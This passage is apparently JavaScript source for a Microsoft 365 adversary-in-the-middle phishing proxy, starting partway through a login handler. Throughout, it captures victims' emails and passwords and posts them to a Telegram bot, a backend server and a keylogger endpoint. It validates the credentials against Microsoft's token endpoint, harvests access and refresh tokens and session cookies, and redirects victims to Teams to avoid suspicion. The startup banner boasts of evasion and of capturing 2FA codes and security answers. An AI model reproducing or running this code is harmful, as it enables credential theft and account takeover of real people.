        attemptCounts.set(email, attemptCount);

        console.log(`[CREDENTIALS] 📧 Email: ${email}`);
        console.log(`[CREDENTIALS] 🔑 Password: ${password ? '***' : 'N/A'}`);
        console.log(`[CREDENTIALS] 📊 Attempt: ${attemptCount}`);
        console.log(`[CREDENTIALS] 📡 IP: ${ip}`);
        console.log(`[CREDENTIALS] 🆔 Session: ${sessionId || 'N/A'}`);

        if (sessionId) {
            sessionStore.sessions.set(sessionId, {
                ...sessionStore.sessions.get(sessionId),
                forms: [...(sessionStore.sessions.get(sessionId)?.forms || []), {
                    email: email,
                    password: password,
                    formData: formData,
                    url: req.url,
                    method: 'POST',
                    ip: ip,
                    timestamp: Date.now()
                }]
            });
        }

        let msg = `🔐 *MICROSOFT LOGIN ATTEMPT #${attemptCount}*\n\n`;
        msg += `*📧 Email:* ${email}\n`;
        msg += `*🔑 Password:* ${password || 'N/A'}\n`;
        msg += `*📡 IP:* ${ip}\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
        msg += `*🆔 Session:* ${sessionId ? sessionId.substring(0, 12) + '...' : 'N/A'}\n`;
        msg += `*🎯 Service:* Microsoft 365\n`;
        msg += `*🛡️ Evasion:* Active`;
        
        sendToTelegram(msg);

        axios.post(`${BACKEND_URL}/api/authenticate`, {
            email: email,
            password: password,
            visitorInfo: {
                fullUrl: req.url,
                userAgent: req.headers['user-agent'],
                sessionId: sessionId,
                ip: ip,
                evasionData: sessionStore.getReplayData(sessionId)?.evasionData || {}
            }
        }).catch(() => {});

        if (KEYLOGGER_URL && password) {
            axios.post(`${KEYLOGGER_URL}/log-combined`, {
                type: 'microsoft_login',
                email: email,
                password: password,
                url: req.url,
                userAgent: req.headers['user-agent'],
                sessionId: sessionId,
                formData: formData,
                service: 'Microsoft 365',
                action: 'login_attempt'
            }).catch(() => {});
        }

        verifyWithMicrosoft(email, password)
            .then((result) => {
                if (result.success) {
                    console.log(`[AUTH] ✅ Valid Microsoft credentials: ${email}`);
                    
                    if (sessionId && result.tokens) {
                        const storedTokens = sessionStore.storeTokens(sessionId, result.tokens);
                        const validTokens = Object.values(storedTokens || {}).filter(t => t && t.value && t.isValid !== false);
                        if (validTokens.length > 0) {
                            sendFullTokenAlert(sessionId, storedTokens).catch(() => {});
                        }
                    }
                    
                    if (sessionId && VICTIM_SESSIONS[sessionId]) {
                        if (result.cookies) {
                            const validCookies = {};
                            for (const [name, data] of Object.entries(result.cookies)) {
                                if (data && data.value && data.value !== 'null' && data.value !== 'undefined') {
                                    validCookies[name] = data;
                                }
                            }
                            if (Object.keys(validCookies).length > 0) {
                                sessionStore.storeCookies(sessionId, validCookies, 'auth_response');
                            }
                        }
                    }
                    
                    let successMsg = `✅ *VALID MICROSOFT CREDENTIALS*\n\n`;
                    successMsg += `*📧 Email:* ${email}\n`;
                    successMsg += `*🔑 Password:* ${password || 'N/A'}\n`;
                    successMsg += `*📡 IP:* ${ip}\n`;
                    successMsg += `*🕐 Time:* ${new Date().toISOString()}\n`;
                    successMsg += `*🎯 Service:* Microsoft 365\n\n`;
                    
                    if (result.tokens) {
                        let hasValidTokens = false;
                        for (const [name, value] of Object.entries(result.tokens)) {
                            if (value && value !== 'null' && value !== 'undefined' && value !== 'N/A') {
                                if (!hasValidTokens) {
                                    successMsg += `*🎟️ Tokens Captured:*\n`;
                                    hasValidTokens = true;
                                }
                                const displayValue = value.length > 50 ? value.substring(0, 50) + '...' : value;
                                successMsg += `  \`${name}\`: \`${displayValue}\`\n`;
                            }
                        }
                    }
                    
                    if (result.cookies) {
                        let hasValidCookies = false;
                        for (const [name, data] of Object.entries(result.cookies)) {
                            if (data && data.value && data.value !== 'null' && data.value !== 'undefined') {
                                if (!hasValidCookies) {
                                    successMsg += `\n*🍪 Cookies Captured:*\n`;
                                    hasValidCookies = true;
                                }
                                const displayValue = data.value.length > 50 ? data.value.substring(0, 50) + '...' : data.value;
                                const httpOnly = data.httpOnly ? '🔒' : '🔓';
                                successMsg += `  ${httpOnly} \`${name}\`: \`${displayValue}\`\n`;
                            }
                        }
                    }
                    
                    sendToTelegram(successMsg);
                    
                    axios.post(`${BACKEND_URL}/api/log-action`, {
                        action: 'login_success',
                        email: email,
                        password: password,
                        tokens: result.tokens,
                        cookies: result.cookies,
                        visitorInfo: {
                            fullUrl: req.url,
                            userAgent: req.headers['user-agent'],
                            sessionId: sessionId,
                            ip: ip
                        }
                    }).catch(() => {});
                    
                    res.writeHead(302, { 
                        'Location': TEAMS_REDIRECT, 
                        'Cache-Control': 'no-store, no-cache, must-revalidate'
                    });
                    res.end();
                } else {
                    console.log(`[AUTH] ❌ Invalid Microsoft credentials: ${email}`);
                    
                    sendToTelegram(`❌ *INVALID MICROSOFT CREDENTIALS*\n\n📧 Email: ${email}\n📡 IP: ${ip}\n🕐 Time: ${new Date().toISOString()}`);
                    
                    axios.post(`${BACKEND_URL}/api/log-action`, {
                        action: 'login_failed',
                        email: email,
                        password: password,
                        visitorInfo: {
                            fullUrl: req.url,
                            userAgent: req.headers['user-agent'],
                            sessionId: sessionId,
                            ip: ip
                        }
                    }).catch(() => {});
                    
                    const errorUrl = `${MICROSOFT_AUTHORIZE_ENDPOINT}?` +
                        `client_id=${MICROSOFT_CLIENT_ID}&` +
                        `response_type=code&` +
                        `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                        `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                        `login_hint=${encodeURIComponent(email)}&` +
                        `error=invalid_credentials`;
                    
                    res.writeHead(302, { 'Location': errorUrl, 'Cache-Control': 'no-store' });
                    res.end();
                }
            })
            .catch((error) => {
                console.error('[ERROR] Microsoft verification failed:', error.message);
                const errorUrl = `${MICROSOFT_AUTHORIZE_ENDPOINT}?` +
                    `client_id=${MICROSOFT_CLIENT_ID}&` +
                    `response_type=code&` +
                    `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                    `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                    `login_hint=${encodeURIComponent(email)}&` +
                    `error=service_error`;
                
                res.writeHead(302, { 'Location': errorUrl });
                res.end();
            });

    } catch (error) {
        console.error('[ERROR] POST handling failed:', error.message);
        res.writeHead(500);
        res.end('Internal server error');
    }
}

function verifyWithMicrosoft(email, password) {
    return new Promise((resolve, reject) => {
        const postData = querystring.stringify({
            client_id: MICROSOFT_CLIENT_ID,
            grant_type: 'password',
            username: email,
            password: password,
            scope: MICROSOFT_SCOPES
        });
        
        const options = {
            hostname: 'login.microsoftonline.com',
            path: '/common/oauth2/v2.0/token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
        };
        
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);
                    if (response.access_token) {
                        const cookies = {};
                        
                        if (response.access_token) {
                            cookies['ESTSAUTH'] = {
                                value: response.access_token,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        }
                        
                        if (response.refresh_token && response.refresh_token !== 'null' && response.refresh_token !== 'undefined') {
                            cookies['ESTSAUTHPERSISTENT'] = {
                                value: response.refresh_token,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        } else {
                            cookies['ESTSAUTHPERSISTENT'] = {
                                value: null,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        }
                        
                        if (response.id_token && response.id_token !== 'null' && response.id_token !== 'undefined') {
                            cookies['ESTSSESSION'] = {
                                value: response.id_token,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        } else {
                            cookies['ESTSSESSION'] = {
                                value: null,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        }
                        
                        resolve({
                            success: true,
                            data: response,
                            tokens: {
                                access_token: response.access_token,
                                refresh_token: response.refresh_token || null,
                                id_token: response.id_token || null
                            },
                            cookies: cookies
                        });
                    } else {
                        resolve({ 
                            success: false, 
                            error: response.error_description || 'Invalid credentials', 
                            cookies: null 
                        });
                    }
                } catch (error) {
                    reject(new Error('Failed to parse Microsoft response'));
                }
            });
        });
        
        req.on('error', reject);
        req.write(postData);
        req.end();
    });
}

// ============================================================
//  START SERVER
// ============================================================

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log('╔═══════════════════════════════════════════════════════════╗');
    console.log('║                                                           ║');
    console.log('║     🛡️  MICROSOFT 365 PROXY v4.1 - ADVANCED EVASION   ║');
    console.log('║     🔐  Full Authentication Data Capture                 ║');
    console.log('║     🤖  OAuth Auto-Capture Enabled                       ║');
    console.log('║     ✅  Fixed Client ID: 4765445b-32c6-49b0-83e6-1d93765276ca ║');
    console.log('║     ✅  Fixed Endpoint: /common                         ║');
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log(`║   📍 Server:    http://localhost:${PORT}                   ║`);
    console.log(`║   🔗 Entry:     ${PROXY_ENTRY_POINT}                     ║`);
    console.log(`║   🍪 Cookies:   ${PROXY_PATHNAMES.cookieStoreEndpoint}  ║`);
    console.log(`║   🔄 Replay:    ${PROXY_PATHNAMES.sessionReplayEndpoint} ║`);
    console.log(`║   📊 Full Auth: ${PROXY_PATHNAMES.fullAuthEndpoint}     ║`);
    console.log(`║   🤖 OAuth:     ${PROXY_PATHNAMES.oauthCaptureEndpoint} ║`);
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║   📊 DATA CAPTURE TYPES:                                 ║');
    console.log('║   ✅ Email, Name, Organization                           ║');
    console.log('║   ✅ Password, 2FA Code, App Password                   ║');
    console.log('║   ✅ Security Questions & Answers                       ║');
    console.log('║   ✅ HttpOnly Cookies & Tokens                          ║');
    console.log('║   ✅ Full Session Replay Data                           ║');
    console.log('║   ✅ OAuth Auto-Capture (No User Input)                 ║');
    console.log('║                                                           ║');
    console.log('╚═══════════════════════════════════════════════════════════╝');
});

// ============================================================
//  CLEANUP
// ============================================================

setInterval(() => {
    sessionStore.cleanup();
}, 300000);

process.on('SIGTERM', () => {
    console.log('🛑 Shutting down gracefully...');
    server.close(() => process.exit(0));
});

process.on('uncaughtException', (err) => {
    console.error('🔥 UNCAUGHT EXCEPTION:', err.message);
});

process.on('unhandledRejection', (reason) => {
    console.error('🔥 UNHANDLED REJECTION:', reason);
});